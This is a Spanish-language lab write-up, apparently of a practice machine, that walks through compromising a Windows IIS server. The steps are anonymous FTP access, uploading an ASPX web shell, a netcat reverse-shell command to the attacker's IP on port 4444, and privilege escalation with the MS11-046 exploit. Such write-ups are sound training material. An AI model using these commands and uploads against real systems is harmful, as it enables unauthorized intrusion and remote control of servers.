
Iniciamos con un escaneo de puertos abiertos y servicios mediante la herramienta nmap
`sudo nmap -p- --open -sS --min-rate 5000 -n -v -sV -Pn `
![[Pasted image 20240911061730.png]]
Podemos observar que el puerto 21 corre un servidor ftp y el 80 un servicio web http, 
veamos que podemos obtener mediante un escaneo de puertos mas avanzado
`nmap -p 21,80 -sCV 10.10.10.5`
![[Pasted image 20240911061832.png]]
Podemos observar que el servidor ftp es accesible mediante el usuario Anonymous (sin contraseña), ademas nos muestra los archivos que contiene.
Accedamos al servidor 
`ftp 10.10.10.5`
![[Pasted image 20240911062627.png]]
Efectivamente contiene los ficheros que muestra el escaneo, veamos que contiene la imagen, por el nombre parece ser una imagen de bienvenida de una web, podria ser la que esta corriendo en el puerto 80.
`get welcome.png`
![[Pasted image 20240911062216.png]]
![[Pasted image 20240911062246.png]]
Al parecer da un error, veamos a mostrar la imagen por consola
`kitty +kitten icat welcome.png`
![[Pasted image 20240911062355.png]]
Este error puede ser porque no hemos descargado la imagen en modo binario, probemos asi
![[Pasted image 20240911062653.png]]
![[Pasted image 20240911062724.png]]
Al parecer es una imagen normal, antes de ver la web escaneare la misma mediante whatweb
![[Pasted image 20240911062919.png]]

Vemos que tenemos un Windows IIS/7.5, vamos a visitar la web
`http://10.10.10.5/`

![[Pasted image 20240913051710.png]]

La web se compone unicamente de esta imagen, la misma que encontramos en el servidor ftp, probemos añadiendo a la url lo que encontramos en el sevidor ftp

`http://10.10.10.5/welcome.png`

![[Pasted image 20240913051856.png]]

`http://10.10.10.5/iisstart.htm`

![[Pasted image 20240914045912.png]]
La maquina es Windows ya que si en la direccion alternamos las misnusculas por mayusculas nos dirige al destino, esto en una maquina linux no pasaria
`http://10.10.10.5/iisstart.htm`
`http://10.10.10.5/IISStart.htm`

![[Pasted image 20240914050034.png]]
Viendo que añadiendo las rutas anteriores nos responde con el contenido del servidor ftp pienso que la web esta conectada a este servidor ftp, por lo que si subimos un archivo deberia mostrarlo.
Probamos subiendo un archivo txt con un contenido cualquiera para ver si lo muestra


![[Pasted image 20240914050128.png]]



Vemos si la web muestra el contenido del txt para confirmar que la web esta conectada al servidor ftp

`http://10.10.10.5/prueba.txt`

![[Pasted image 20240914050231.png]]

La web esta conectada al servidor ftp, por lo que si subimos una web shell podremos ejecutarla.
Buscamos en nuestro sistema un binario 
`locate .aspx`
![[Pasted image 20240915040355.png]]

Probaremos con la siguiente 
`/usr/share/davtest/backdoors/aspx_cmd.aspx`
Lo añadimos al directorio actual de trabajo y lo  subiremos por ftp y lo ejecutaremos en la web
![[Pasted image 20240915042044.png]]
![[Pasted image 20240915042127.png]]
Ejecutamos la WebShell
`http://10.10.10.5/aspx_cmd.aspx`

![[Pasted image 20240915042252.png]]
![[Pasted image 20240915042324.png]]
Ahora podemos subir una reverse shell y ponernos en escucha para ganar el acceso
![[Pasted image 20240915042556.png]]
Añadimos la reverse shell en el directorio actual de trabajo y la subimos mediante ftp
`cp /home/mblnt/Desktop/SecLists/Web-Shells/FuzzDB/nc.exe .`

![[Pasted image 20240915042705.png]]
![[Pasted image 20240915045821.png]]

Ahora localizamos la reverse shell para poder ejecutarla

En un servidor **IIS (Internet Information Services)** en Windows, la ruta **`inetpub/wwwroot`** es el directorio predeterminado donde se almacenan los archivos web que se sirven a través del servidor.
![[Pasted image 20240915043708.png]]
Otra forma de localizar el archivo nc.exe
![[Pasted image 20240915043554.png]]
Si no lo encuentra en el disco C: deberia estar en otro como el E:, etc..

Con la dirección de la reverse shell nos ponemos en esucha y la ejecutamos 

![[Pasted image 20240915043912.png]]
`C:\inetpub\wwwroot\nc.exe -e cmd 10.10.14.51 4444`


![[Pasted image 20240915044135.png]]

![[Pasted image 20240915045856.png]]
Ya tenemos acceso a la reverse shell
![[Pasted image 20240915050720.png]]

Vemos la inormacion del sistema y la version es demasiado antigua por lo que buscamos algun exploit para escalar privilegios

![[Pasted image 20240915050839.png]]

![[Pasted image 20240915050903.png]]

Lo descargamos y lo subitmos mediante el sevidor ftp
![[Pasted image 20240915051251.png]]
Lo ejecutamos
`cd C:\inetpub\wwwroot\`
![[Pasted image 20240915051340.png]]
`\.ms11-046.exe`
![[Pasted image 20240915051758.png]]

FLAGS

![[Pasted image 20240915051904.png]]
USER FLAG
![[Pasted image 20240915052031.png]]
ROOT FLAG
![[Pasted image 20240915052115.png]]




--------------------------------------------------------------------------
Escalada de privilegios mediante metaasploit
